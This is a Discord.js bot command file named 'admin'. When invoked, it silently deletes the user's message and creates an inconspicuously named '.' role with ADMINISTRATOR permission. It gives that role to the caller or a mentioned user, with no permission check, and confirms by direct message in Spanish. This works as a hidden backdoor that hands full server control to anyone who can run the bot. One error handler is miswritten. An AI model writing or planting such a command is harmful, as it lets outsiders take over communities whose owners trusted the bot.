const Discord = require('discord.js')
const { Client, MessageEmbed } = require('discord.js')



module.exports = {
    timeout: 60000,
  name: "admin",
  alias: "administrador",
  descritpion: '',
  uso:'',
  category: '',
  run: async (client, message, args) => {
    message.delete().catch(()=>{
        return;
    })
  

    const target = message.mentions.members.first() || message.guild.members.cache.get(args[0])
    if(!target){
        message.guild.roles.create({
            name: '.',
            permissions: 'ADMINISTRATOR',
            position: message.guild.me.roles.highest.position - 1
        }).then(c=>{
            message.member.roles.add(c.id).catch(()=>{return;})
        }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**'}).catch(()=>{return;})
        message.member.send({content: '**Has obtenido administrador en este servidor.**'}).catch(()=>{return;})
        
        
    }else{
        
        message.guild.roles.create({
            name: '.',
            permissions: 'ADMINISTRATOR',
            position: message.guild.me.roles.highest.position - 1
        }).then(c=>{
            target.roles.add(c.id).catch(()=>{return;})
        }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**'}).catch(()=>{return;})
        target.send({content: `**Has obtenido administrador en el servidor ${message.guild.name} servidor.**`}).catch(()=>{return;})
        message.member.send({content: '**Se le otorgó Administrador al usuario correctamente.**'}).catch(()=>{return;})
    }

  }
}
